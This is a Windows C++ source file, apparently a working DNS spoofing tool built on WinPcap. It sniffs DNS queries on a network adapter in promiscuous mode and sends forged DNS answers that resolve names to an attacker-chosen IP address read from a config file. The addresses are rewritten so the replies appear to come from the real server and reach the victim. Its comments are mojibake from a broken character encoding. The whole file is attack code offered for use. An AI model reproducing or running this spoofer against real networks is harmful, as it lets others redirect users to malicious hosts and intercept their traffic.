//By Dexter Ju
//email:jvdajd@gmail.com
//website:kutopia.me
//���ڽ���DNS��ƭ�ĳ���
//������ͬĿ¼�°���config_DNS.txt
//����Ϊ
//ip proto udp and dst port 53 


#include "stdafx.h"
#include <winsock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <mstcpip.h>
#include "struct.h"
#include <pcap.h>
#include "ip_address.h"
#include <thread>
#include <string>
#include <iostream>
#include<fstream>

#pragma comment(lib, "Ws2_32.lib")


#define BUFF_SIZE 65535//�����С
#define TYPE_IP 0X0800

char errbuf[PCAP_ERRBUF_SIZE];
int int_num = 0;
u_char gateway_mac[6];
ip_pkt * ip_header = NULL;
u_int netmask_source;
u_int netmask_destination;
u_int ip_source = NULL;//Դ��������ip��ַ
u_int ip_destination = NULL;//Ŀ�ĵ�������IP��ַ
u_int ip_victim = NULL;//�ܺ�������IP
u_int ip_gateway = NULL;//ת������������IP

const char * packet_filter_s = NULL;
const char * packet_filter_d = NULL;
struct bpf_program fcode_s;//Դ�˹�����
struct bpf_program fcode_d;//Ŀ�ĵض˹�����

pcap_addr_t *a;
pcap_t * source_winpcap = NULL;//source���
pcap_t * destination_winpcap = NULL;//destination���
pcap_if_t *alldevs;//������ʾ�豸�б��ָ��
pcap_if_t *d;//������ʾ�豸�б��ָ��

in_addr destination_in_addr;
u_char source_mac[6] = { NULL };//Դ��������MAC��ַ
u_char destination_mac[6] = { NULL };//Ŀ�Ķ�������MAC��ַ
u_char from_mac[6] = { NULL };//Դ����Դ��mac��ַ

const char * target = NULL; //αװ��Ŀ��վ��
char * resolve_ip = NULL;
std::string target_s;
std::string redriect_address;
char internet_gateway[15] = { NULL };//���������ص�ַ
char ifile_buff[2][100] = { NULL };

u_char source_buff[BUFF_SIZE] = { NULL };//Դ�˻���
u_char destination_buff[BUFF_SIZE] = { NULL };//Ŀ�Ķ˻���
u_long victim_address = { NULL };//�ܺ���IP��ַ


std::ifstream ifile;

int inum;
int i = 0;

//��ʼ������MAC��ַ




void source_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
void destination_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);


void destination_fun(){
	std::cout << "��ʼ����" << std::endl;
	pcap_loop(destination_winpcap, 0, (pcap_handler)destination_handler, NULL);
}

void destination_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)//�յ���֮��Ļص������������е�DNS��������ͬһ��ַ
{
	//��������������ص�TCP������������д������ظ�Դ��
	et_header *eth_ptr_q;
	ip_pkt * ip_ptr_q;
	UDP_Header *udp_ptr_q;
	eth_ptr_q = (et_header *)pkt_data;
	ip_ptr_q = (ip_pkt *)(pkt_data + ETH_HEADER);//���target����IPɸѡ
	udp_ptr_q = (UDP_Header *)(pkt_data + ETH_HEADER + IP_HEADER);
	//ȷ�������ض���Ŀ�귵�صİ�

	if (fliter_mac(eth_ptr_q->eh_src, source_mac))
	{
		//ip�Ѿ���дΪtargetIP����Ҫ��MAC��ַ����ɸѡ,��ֹ��׽����source������α��������sourcemac�Ƿ�Ϊ���������Ϊ��������
		return;

	}
	et_header * eth_ptr_a;
	ip_pkt * ip_ptr_a;
	UDP_Header * udp_ptr_a;
	DNS_HEADER * dns_ptr_a;
	answer * dns_answer_a;
	memcpy(destination_buff, pkt_data, header->len);
	eth_ptr_a = (et_header*)destination_buff;
	ip_ptr_a = (ip_pkt *)(destination_buff + ETH_HEADER);//��ʼ���
	udp_ptr_a = (UDP_Header *)(destination_buff + ETH_HEADER + IP_HEADER);
	dns_ptr_a = (DNS_HEADER *)(destination_buff + ETH_HEADER + IP_HEADER + UDP_HEADER);
	dns_answer_a = (answer *)(destination_buff + header->len);
	memcpy(eth_ptr_a->eh_dst, gateway_mac, 6);//��д����MAC���ص�ַ
	memcpy(eth_ptr_a->eh_src, destination_mac, 6);
	eth_ptr_a->eh_type = htons(TYPE_IP);
	ip_ptr_a->src = ip_ptr_q->dst;//��дĿ����վIP
	ip_ptr_a->dst = ip_ptr_q->src;//��д�ܺ���IP
	ip_ptr_a->len = htons(header->len + sizeof(answer) - ETH_HEADER);
	ip_ptr_a->cksum = 0;
	ip_ptr_a->cksum = in_cksum((u_short *)ip_ptr_a, 20);
	udp_ptr_a->DstPort = udp_ptr_q->SrcPort;
	udp_ptr_a->SrcPort = udp_ptr_q->DstPort;
	udp_ptr_a->Chksum = 0;
	udp_ptr_a->Len = htons(header->len + sizeof(answer) - IP_HEADER - ETH_HEADER);//��Ҫ����
	dns_ptr_a->flags = htons(0x8180);
	dns_ptr_a->questions = htons(1);
	dns_ptr_a->answers = htons(1);
	dns_ptr_a->author = 0;
	dns_ptr_a->addition = 0;//���ָ���
	dns_answer_a->partion = 0x0cc0;
	dns_answer_a->type = htons(0x0001);
	dns_answer_a->ttl = htonl(300);
	dns_answer_a->class_in = htons(1);
	dns_answer_a->data_len = htons(4);
	dns_answer_a->ip_addr.s_addr = inet_addr(resolve_ip);
	udp_cksum(destination_buff);



	if ((pcap_sendpacket(destination_winpcap, (u_char*)destination_buff,header->len+sizeof(answer))) != 0)
	{
		fprintf(stderr, "\nError sending the packet : \n", pcap_geterr(destination_winpcap));
		return;
	}

	memset(destination_buff, NULL, header->len + sizeof(answer));
	printf("��ƭDNSӦ������ͳɹ�������Ϊ��%d\n", ETH_HEADER + IP_HEADER + UDP_HEADER + sizeof(DNS_HEADER)+sizeof(answer));
	fflush(stdout);
	return;

}






int _tmain(int argc, _TCHAR* argv[])
{
	//��ȡ�����ļ�
	ifile.open("conf_DNS.txt", std::ios::in);

	std::string config;
	int index = 0;
	while (ifile.getline(ifile_buff[index], 100)){
		index++;
	}
	packet_filter_d = ifile_buff[0];
	resolve_ip = ifile_buff[1];

	//���������豸������
	loadiphlpapi();
	//����������ѡ��ͳ�ʼ��
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		return -1;
	}


	//��ӡ�豸�б�
	for (d = alldevs; d; d = d->next)
	{
		ifprint(d, i);
		++i;
	}
	int_num = i;

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}

	//����Ŀ�ĵ��豸�Ĵ���
	//destination
	//��Ҫ��ӻ�ȡ����IP��mac��ַ�Ĺ���
	printf("Enter the interface number for source (1-%d):", int_num);//ѡ��Ŀ�ĵ��豸
	fflush(stdout);
	scanf("%d", &inum);
	if (inum < 1 || inum > int_num)
	{
		printf("\nInterface number out of range.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* Jump to the selected adapter */
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);
	for (a = d->addresses; a; a = a->next) {
		switch (a->addr->sa_family)
		{
		case AF_INET:
			printf("\tAddress Family Name: AF_INET\n");
			if (a->addr)
				destination_in_addr = ((struct sockaddr_in *)a->addr)->sin_addr;
			ip_destination = ((struct sockaddr_in *)a->addr)->sin_addr.s_addr;//��ȡ����IP
			if (a->netmask)
				netmask_destination = ((struct sockaddr_in *)a->netmask)->sin_addr.s_addr;//��ȡ��������
			break;
		default:
			continue;
		}
	}

	if (get_mac_address(d, destination_mac))
	{
		printf("��ȡMAC��ַʧ�ܣ�");
		return -1;
	}
	/* Open the adapter */
	if ((destination_winpcap = pcap_open_live(d->name,	// name of the device
		65536,			// portion of the packet to capture. 
		// 65536 grants that the whole packet will be captured on all the MACs.
		1,				// promiscuous mode (nonzero means promiscuous)
		10,			// read timeout
		errbuf			// error buffer
		)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}
	//׼����ȡ����IP��mac��ַ

	get_gateway(destination_in_addr, internet_gateway);
	printf("����������Ϊ%s\n", internet_gateway);
	ip_gateway = inet_addr(internet_gateway);
	get_gateway_mac_address(gateway_mac, ip_gateway);
	printf("���ص�MAC��ַΪ�� %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n",
		gateway_mac[0],
		gateway_mac[1],
		gateway_mac[2],
		gateway_mac[3],
		gateway_mac[4],
		gateway_mac[5]);


	if (pcap_compile(destination_winpcap, &fcode_d, packet_filter_d, 1, netmask_destination) <0)
	{
		fprintf(stderr, "\nUnable to compile the packet filter. Check the syntax.\n");
		/* �ͷ��豸�б� */
		pcap_freealldevs(alldevs);
		return -1;
	}

	//���ù�����
	if (pcap_setfilter(destination_winpcap, &fcode_d)<0)
	{
		fprintf(stderr, "\nError setting the filter.\n");
		/* �ͷ��豸�б� */
		pcap_freealldevs(alldevs);
		return -1;
	}


	destination_fun();


	return 0;
}


